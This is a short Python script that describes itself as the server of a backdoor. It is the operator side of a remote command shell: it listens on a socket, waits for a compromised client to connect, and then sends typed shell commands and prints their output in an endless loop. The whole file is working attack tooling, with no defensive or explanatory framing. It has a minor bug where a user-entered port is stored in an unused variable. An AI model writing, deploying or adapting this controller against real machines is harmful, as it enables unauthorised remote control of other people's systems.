"""
Description: The server responsible for acting as our backdoor.
Author: Aleksa Zatezalo
Date: September 2022
"""

# Imports
import socket

# Creating Listening Port
HOST = '127.0.0.1' # '192.168.43.82'
PORT = 8081 # 2222
FORMAT = 'utf-8'

# You can delete here after change HOST
if HOST == '127.0.0.1':
    print(f"[!] Don't forget to change default HOST:{HOST} to your HOST:{socket.gethostbyname(socket.gethostname())} in both server and client")

new_port = input('Input Host Port (Blank if default).')
if (new_port != "\n"):
    REMOTE_PORT = new_port

server = socket.socket()
server.bind((HOST, PORT))

# Starting Server
print('[+] Server Started')
print('[+] Listening For Client Connection ...')
server.listen(1)
client, client_addr = server.accept()
print(f'[+] {client_addr} Client connected to the server')

# Reciving Commands
while True:
    command = input('Enter Command : ')
    command = command.encode(FORMAT, errors='ignore')
    client.send(command)
    print('[+] Command sent')
    output = client.recv(1024)
    output = output.decode(FORMAT, errors='ignore')
    print(f"Output: {output}")
